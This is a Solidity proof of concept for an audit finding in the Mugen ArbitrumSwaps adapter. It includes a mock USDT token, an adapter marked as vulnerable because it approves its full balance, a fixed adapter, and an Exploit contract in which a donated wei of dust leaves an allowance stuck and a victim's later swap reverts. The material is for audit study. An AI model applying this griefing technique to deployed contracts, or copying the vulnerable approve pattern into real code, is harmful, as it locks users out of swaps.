// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Mugen — ArbitrumSwaps approves the router for balanceOf(this) (Pashov, January 2023).
    USDT reverts when approve changes a non-zero allowance to another non-zero value.
    Donating 1 wei, then swapping 1 USDT, leaves the router 1 wei of allowance.
    The next USDT swap's approve reverts, so every later USDT swap is unusable.
    Approving amountIn instead returns the allowance to 0 and the second swap works. */

contract Usdt {
    string public symbol = "USDT";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        uint256 current = allowance[msg.sender][spender];
        require(current == 0 || amount == 0, "USDT approve race");
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Router {
    Usdt public usdt;

    constructor(Usdt _usdt) {
        usdt = _usdt;
    }

    function exactInput(uint256 amountIn) external {
        require(usdt.transferFrom(msg.sender, address(this), amountIn), "pull");
    }
}

contract Adapter {
    Usdt public usdt;
    Router public router;

    constructor(Usdt _usdt, Router _router) {
        usdt = _usdt;
        router = _router;
    }

    function swapExactInputSingle(uint256 amountIn) external {
        require(usdt.transferFrom(msg.sender, address(this), amountIn), "in");
        uint256 bal = usdt.balanceOf(address(this));
        usdt.approve(address(router), bal); // @> VULN: balanceOf includes donated dust, so allowance is left non-zero
        router.exactInput(amountIn);
    }
}

contract AdapterFixed {
    Usdt public usdt;
    Router public router;

    constructor(Usdt _usdt, Router _router) {
        usdt = _usdt;
        router = _router;
    }

    function swapExactInputSingle(uint256 amountIn) external {
        require(usdt.transferFrom(msg.sender, address(this), amountIn), "in");
        usdt.approve(address(router), amountIn);
        router.exactInput(amountIn);
    }
}

contract Victim {
    Usdt public usdt;
    Adapter public adapter;

    constructor(Usdt _usdt, Adapter _adapter) {
        usdt = _usdt;
        adapter = _adapter;
    }

    function swap(uint256 amount) external {
        usdt.approve(address(adapter), amount);
        adapter.swapExactInputSingle(amount);
    }
}

contract Exploit {
    Usdt public usdt; // nonce 1
    Router public router; // nonce 2
    Adapter public adapter; // nonce 3
    Victim public victim; // nonce 4
    bool public secondReverted;

    constructor() {
        usdt = new Usdt();
        router = new Router(usdt);
        adapter = new Adapter(usdt, router);
        victim = new Victim(usdt, adapter);
    }

    function run() external {
        usdt.mint(address(this), 1);
        usdt.transfer(address(adapter), 1);
        require(usdt.balanceOf(address(adapter)) == 1, "dust");
        usdt.mint(address(this), 1 ether);
        usdt.approve(address(adapter), 1 ether);
        adapter.swapExactInputSingle(1 ether);
        require(usdt.allowance(address(adapter), address(router)) == 1, "1 wei left");
        usdt.mint(address(victim), 1000 ether);
        try victim.swap(1000 ether) {
            secondReverted = false;
        } catch {
            secondReverted = true;
        }
        require(secondReverted, "second swap must revert");
        require(usdt.allowance(address(adapter), address(router)) == 1, "allowance stuck");
        require(usdt.balanceOf(address(victim)) == 1000 ether, "victim USDT unmoved");
    }
}
